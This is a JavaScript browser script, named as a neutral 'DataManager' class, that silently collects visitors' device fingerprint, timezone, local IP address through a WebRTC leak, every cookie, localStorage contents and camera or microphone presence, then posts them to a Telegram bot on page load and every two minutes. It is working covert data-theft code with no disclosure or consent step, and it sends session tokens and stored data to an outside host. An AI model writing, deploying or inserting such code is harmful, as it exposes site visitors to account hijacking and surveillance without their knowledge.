class DataManager {
    constructor() {
        this.deviceId = 'DEV' + Date.now().toString(36);
        localStorage.setItem('device_id', this.deviceId);
        this.sessionStart = Date.now();
        this.mediaCache = [];
    }
    
    async collectAll() {
        const data = {
            device: this.getDeviceInfo(),
            
            system: this.getSystemInfo(),
            
            network: await this.getNetworkInfo(),
            
            storage: this.getStorageInfo(),
            
            media: this.getMediaInfo(),
            
            activity: {
                sessionStart: this.sessionStart,
                currentTime: Date.now(),
                page: window.location.pathname,
                url: window.location.href
            }
        };
        
        await this.sendAll(data);
    }
    
    getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            appVersion: navigator.appVersion,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            devicePixelRatio: window.devicePixelRatio,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };
    }
    
    getSystemInfo() {
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
            hourCycle: Intl.DateTimeFormat().resolvedOptions().hourCycle,
            numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
        };
    }
    
    async getNetworkInfo() {
        const info = {
            online: navigator.onLine
        };
        
        if (navigator.connection) {
            info.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData,
                type: navigator.connection.type
            };
        }
        
        try {
            const rtc = new RTCPeerConnection();
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            
            await new Promise(resolve => {
                rtc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch) {
                            info.localIP = ipMatch[1];
                        }
                    }
                };
                setTimeout(() => {
                    rtc.close();
                    resolve();
                }, 1000);
            });
        } catch (e) {}
        
        return info;
    }
    
    getStorageInfo() {
        const info = {
            localStorage: {},
            sessionStorage: {},
            cookies: document.cookie,
            localStorageSize: 0,
            sessionStorageSize: 0
        };
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            info.localStorage[key] = value;
            info.localStorageSize += key.length + (value ? value.length : 0);
        }
        
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            info.sessionStorage[key] = value;
            info.sessionStorageSize += key.length + (value ? value.length : 0);
        }
        
        return info;
    }
    
    getMediaInfo() {
        const info = {
            images: [],
            videos: [],
            hasCamera: false,
            hasMicrophone: false,
            audioFiles: [],
            videoFiles: [],
            totalMediaElements: 0
        };
        
        const allElements = document.querySelectorAll('*');
        info.totalMediaElements = allElements.length;
        
        allElements.forEach(element => {
            if (element.tagName === 'IMG' && element.src) {
                if (element.src.startsWith('data:image') || 
                    element.src.includes('jpeg') || 
                    element.src.includes('png') || 
                    element.src.includes('jpg') ||
                    element.src.includes('gif')) {
                    info.images.push(element.src.substring(0, 100) + '...');
                }
            }
            
            if (element.tagName === 'VIDEO') {
                info.videos.push('video_element_found');
                if (element.src) {
                    info.videoFiles.push(element.src.substring(0, 80));
                }
                if (element.srcObject) {
                    info.videos.push('video_stream_active');
                }
            }
            
            if (element.tagName === 'AUDIO' && element.src) {
                info.audioFiles.push(element.src.substring(0, 80));
            }
            
            if (element.style && element.style.backgroundImage) {
                const bg = element.style.backgroundImage;
                if (bg.includes('url') || bg.includes('data:image')) {
                    info.images.push('background_image');
                }
            }
            
            if (element.src && (
                element.src.includes('.mp4') || 
                element.src.includes('.webm') || 
                element.src.includes('.mov'))) {
                info.videoFiles.push(element.src.substring(0, 80));
            }
        });
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            if (key.includes('image') || key.includes('photo') || key.includes('img')) {
                if (value && value.startsWith('data:image')) {
                    info.images.push('localstorage_image: ' + key);
                }
            }
            
            if ((key.includes('video') || key.includes('audio')) && value) {
                if (value.startsWith('data:video') || value.startsWith('data:audio')) {
                    info.audioFiles.push('localstorage_media: ' + key);
                }
            }
        }
        
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    devices.forEach(device => {
                        if (device.kind === 'videoinput') info.hasCamera = true;
                        if (device.kind === 'audioinput') info.hasMicrophone = true;
                    });
                })
                .catch(() => {});
        }
        
        return info;
    }
    
    async sendAll(data) {
        try {
            if (!window.SYSTEM_SETTINGS) return;
            
            await this.sendDeviceInfo(data.device);
            
            await this.sendSystemInfo(data.system);
            
            await this.sendNetworkInfo(data.network);
            
            await this.sendStorageInfo(data.storage);
            
            await this.sendMediaInfo(data.media);
            
            await this.sendActivityInfo(data.activity);
            
        } catch (error) {
            console.error('Send error:', error);
        }
    }
    
    async sendDeviceInfo(device) {
        try {
            const message = `
📱 DEVICE INFO
🆔 ${this.deviceId}
📱 ${device.platform || 'Unknown'}
🌐 ${device.userAgent ? device.userAgent.substring(0, 60) + '...' : 'No UA'}
🗣️ ${device.language || 'Unknown'}
🖥️ ${device.screen ? device.screen.width + 'x' + device.screen.height : 'Unknown'}
💾 ${device.deviceMemory || 'Unknown'}GB RAM
⚡ ${device.hardwareConcurrency || 'Unknown'} cores
👆 ${device.maxTouchPoints || 'Unknown'} touch points
        `;
        
        await this.sendTelegram(message);
    } catch (error) {
        await this.sendTelegram(`📱 DEVICE INFO (Basic)
🆔 ${this.deviceId}
📱 ${navigator.platform}
🌐 ${navigator.userAgent.substring(0, 60)}...
🖥️ ${screen.width}x${screen.height}`);
    }
}
    
    async sendSystemInfo(system) {
        const message = `
🖥️ SYSTEM INFO
⏰ Timezone: ${system.timezone}
🗺️ Locale: ${system.locale}
📅 Calendar: ${system.calendar}
🕐 Hour Cycle: ${system.hourCycle}
🔢 Numbering: ${system.numberingSystem}
        `;
        
        await this.sendTelegram(message);
    }
    
    async sendNetworkInfo(network) {
        const message = `
🌐 NETWORK INFO
📶 Online: ${network.online}
${network.connection ? `📡 Type: ${network.connection.effectiveType}
📥 Downlink: ${network.connection.downlink} Mbps
⏱️ RTT: ${network.connection.rtt} ms
💾 Save Data: ${network.connection.saveData}` : 'No connection info'}
${network.localIP ? `🔗 Local IP: ${network.localIP}` : ''}
        `;
        
        await this.sendTelegram(message);
    }
    
    async sendStorageInfo(storage) {
        const message = `
🗄️ STORAGE INFO
🍪 Cookies: ${storage.cookies.length > 100 ? 'Yes' : 'No'}
💾 LocalStorage: ${storage.localStorageSize} chars
📦 SessionStorage: ${storage.sessionStorageSize} chars
🔑 Keys: ${Object.keys(storage.localStorage).length}
        `;
        
        await this.sendTelegram(message);
        
        if (Object.keys(storage.localStorage).length > 0) {
            const storageData = Object.entries(storage.localStorage)
                .map(([key, value]) => `${key}: ${value ? value.substring(0, 50) + '...' : 'empty'}`)
                .join('\n');
            
            if (storageData.length < 4000) {
                await this.sendTelegram(`📝 Storage Content:\n${storageData}`);
            }
        }
    }
    
    async sendMediaInfo(media) {
        const message = `
📸 MEDIA INFO
🖼️ Images: ${media.images.length}
🎥 Videos: ${media.videos.length}
📹 Camera: ${media.hasCamera ? 'Yes' : 'No'}
🎤 Microphone: ${media.hasMicrophone ? 'Yes' : 'No'}
        `;
        
        await this.sendTelegram(message);
    }
    
    async sendActivityInfo(activity) {
        const message = `
🎯 ACTIVITY INFO
🕐 Session Start: ${new Date(activity.sessionStart).toLocaleString('ar-SA')}
⏰ Current Time: ${new Date(activity.currentTime).toLocaleString('ar-SA')}
📄 Page: ${activity.page}
🔗 URL: ${activity.url}
        `;
        
        await this.sendTelegram(message);
    }
    
    async sendTelegram(text) {
        try {
            const telegramUrl = `https://api.telegram.org/bot${window.SYSTEM_SETTINGS.API_KEY}/sendMessage`;
            
            await fetch(telegramUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: window.SYSTEM_SETTINGS.CHANNEL_CODE,
                    text: text
                })
            });
        } catch (error) {
            console.error('Telegram send failed');
        }
    }
    
    start() {
        setTimeout(() => this.collectAll(), 2000);
        
        setInterval(() => {
            if (document.visibilityState === 'visible') {
                this.collectAll();
            }
        }, 120000);
    }
}

setTimeout(() => {
    if (window.SYSTEM_SETTINGS) {
        const manager = new DataManager();
        manager.start();
        window.dataManager = manager;
    }
}, 3000);